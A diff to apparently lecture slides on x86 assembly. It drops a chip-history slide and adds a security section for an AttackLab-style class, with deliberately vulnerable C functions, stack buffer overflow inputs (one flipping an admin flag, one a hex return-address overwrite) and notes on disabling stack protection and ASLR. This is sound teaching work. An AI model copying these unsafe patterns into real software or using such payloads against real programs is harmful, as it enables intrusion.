@@ -96,24 +96,6 @@ Section 1. Float
 # History: FP Support in x86
 Section 1. Float
 
-## 80386
-- CPU + FPU together on one chip
-- Some 80386 chips had FP support while some didn't
-- Being used in 'Tomahawk Cruise Missile'
-
-## 80486
-- FP support always available
-
-<div class="abs-tr m-6">
- <img src="/img/MG80386-a.jpg" width="280">
- <div class="w-full text-center text-sm">A 80386 chip</div>
-</div>
-
----
-
-# History: FP Support in x86
-Section 1. Float
-
 ## The x87 FPU Architecture
 - The FPU has 8 general purpose 80-bit (double extended-precision) registers.
 - They are labeled st(0), st(1), …, st(7).
@@ -952,6 +934,100 @@ image: ./img/section-4.jpg
   <div class="text-2xl font-bold">Section 4</div>
   <h1 class="text-8xl!">More</h1>
 </div>
+
+---
+
+# Security: Vulnerability in Assemble Architecture
+Section 4. More
+
+The assemble architecture is very powerful, but it's also very **dangerous**.
+
+The most common vulnerability is **memory corruption**.
+
+Let's see some examples. Meanwhile, there are possibly helpful for you to complete AttackLab.
+
+The example code should be compiled with with `-fno-stack-protector` flag. Also, you should disable ASLR.
+
+---
+
+# Exploit: Variable overwrite
+Section 4. More
+
+```c
+void variable_overwrite() {
+  volatile int is_admin = 0;
+  char username[8];
+  scanf("%s", username);
+  if (is_admin) {
+    printf("Hello admin %s!\n", username);
+  } else {
+    printf("You are not admin. I am calling 110!\n");
+  }
+}
+```
+
+Stdin
+
+```
+aaaaaaaaa
+```
+
+Stdout
+
+```
+Hello admin aaaaaaaaa!
+```
+
+---
+
+# Exploit: Return Address Overwrite
+Section 4. More
+
+```c
+void success() {
+  printf("HaHaHa! No one can reach here!\n");
+}
+
+void echo() {
+  char buf[8];
+  scanf("%s", buf);
+  printf("You entered: %s\n", buf);
+}
+```
+
+Stdin (in hex form using `xxd`)
+
+```
+00000000: 6161 6161 6161 6161 6262 6262 6262 6262  aaaaaaaabbbbbbbb
+00000010: e451 5555 5555 0000 0a00 00              .QUUUU.....
+```
+
+Stdout
+
+```
+HaHaHa! No one can reach here!
+```
+
+---
+
+# Exploit: More Methods
+Section 4. More
+
+## Code Injection
+
+- Inject code onto stack
+- Change return address to injected code
+- RCE
+
+## Return-Oriented Programming
+
+- Find gadgets in binary
+- Inject gadgets chain onto stack
+- RCE
+
+<!-- 
+Use chalk to demonstrate these methods
+ -->
 
 ---
 layout: cover
